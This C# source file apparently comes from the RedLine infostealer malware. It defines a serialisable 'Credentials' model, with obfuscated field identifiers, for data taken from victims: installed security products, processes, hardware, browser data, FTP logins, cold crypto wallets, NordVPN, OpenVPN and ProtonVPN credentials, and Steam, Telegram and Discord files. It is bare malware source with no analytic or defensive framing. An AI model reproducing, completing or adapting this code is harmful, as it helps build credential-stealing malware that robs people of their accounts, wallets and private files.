using System.Collections.Generic;
using System.Runtime.Serialization;
using ProtoBuf;

namespace RedLine.SharedModels;

[DataContract(Name = "Entity1", Namespace = "Entity")]
[ProtoContract(Name = "Credentials")]
public class Credentials
{
	[ProtoMember(1, Name = "Defenders")]
	[DataMember(Name = "Id1")]
	public IList<string> Defenders { get; set; }

	[DataMember(Name = "Id2")]
	[ProtoMember(2, Name = "Languages")]
	public IList<string> Languages { get; set; }

	[ProtoMember(3, Name = "InstalledSoftwares")]
	[DataMember(Name = "Id3")]
	public IList<string> InstalledSoftwares { get; set; }

	[ProtoMember(4, Name = "Processes")]
	[DataMember(Name = "Id4")]
	public IList<string> Processes { get; set; }

	[DataMember(Name = "Id5")]
	[ProtoMember(5, Name = "Hardwares")]
	public IList<Hardware> Hardwares { get; set; }

	[DataMember(Name = "Id6")]
	[ProtoMember(6, Name = "Browsers")]
	public IList<Browser> Browsers { get; set; }

	[ProtoMember(7, Name = "FtpConnections")]
	[DataMember(Name = "Id7")]
	public IList<LoginPair> FtpConnections { get; set; }

	[ProtoMember(8, Name = "InstalledBrowsers")]
	[DataMember(Name = "Id8")]
	public IList<InstalledBrowserInfo> InstalledBrowsers { get; set; }

	[ProtoMember(9, Name = "Files")]
	[DataMember(Name = "Id9")]
	public IList<RemoteFile> Files { get; set; }

	[ProtoMember(12, Name = "SteamFiles")]
	[DataMember(Name = "Id10")]
	public IList<RemoteFile> SteamFiles { get; set; }

	[ProtoMember(10, Name = "ColdWallets")]
	[DataMember(Name = "Id11")]
	public IList<RemoteFile> ColdWallets { get; set; }

	[DataMember(Name = "Id12")]
	[ProtoMember(13, Name = "NordVPN")]
	public IList<LoginPair> NordVPN { get; set; }

	[DataMember(Name = "Id13")]
	[ProtoMember(14, Name = "OpenVPN")]
	public IList<RemoteFile> OpenVPN { get; set; }

	[ProtoMember(15, Name = "ProtonVPN")]
	[DataMember(Name = "Id14")]
	public IList<RemoteFile> ProtonVPN { get; set; }

	[ProtoMember(16, Name = "TelegramFiles")]
	[DataMember(Name = "Id15")]
	public IList<RemoteFile> TelegramFiles { get; set; }

	[ProtoMember(17, Name = "Discord")]
	[DataMember(Name = "Id16")]
	public IList<RemoteFile> Discord { get; set; }
}
